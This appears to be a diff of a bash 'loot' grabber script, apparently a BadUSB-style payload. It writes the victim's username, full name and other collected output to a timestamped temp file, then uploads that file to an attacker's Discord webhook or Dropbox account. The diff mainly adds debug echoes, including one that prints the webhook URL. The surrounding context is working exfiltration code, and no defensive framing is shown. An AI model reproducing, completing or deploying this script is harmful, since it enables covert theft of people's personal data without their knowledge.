@@ -2,7 +2,7 @@
 
 # Set up file name with timestamp and username
 FileName="$TMPDIR/$USER-LOOT-$(date '+%Y-%m-%d_%H-%M').txt"
-echo FileName
+
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -18,6 +18,7 @@ get_full_name() {
 
 # Assign full name to a variable
 fullName=$(get_full_name)
+
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -64,10 +65,12 @@ EOF
 # Write output to file
 echo "$output" > "$FileName"
 
+
 #------------------------------------------------------------------------------------------------------------------------------------
 
 # Function to upload file or message to Discord webhook
 upload_discord() {
+    echo Uploading discord
     local file="$1"
     local text="$2"
     local hookurl="$dc"
@@ -81,6 +84,7 @@ upload_discord() {
     fi
 }
 
+echo $dc
 # Check if Discord webhook URL is set and upload file
 if [ -n "$dc" ]; then
     upload_discord "$FileName" ""
@@ -106,3 +110,5 @@ dropbox_upload() {
 if [ -n "$db" ]; then
     dropbox_upload "$FileName"
 fi
+
+
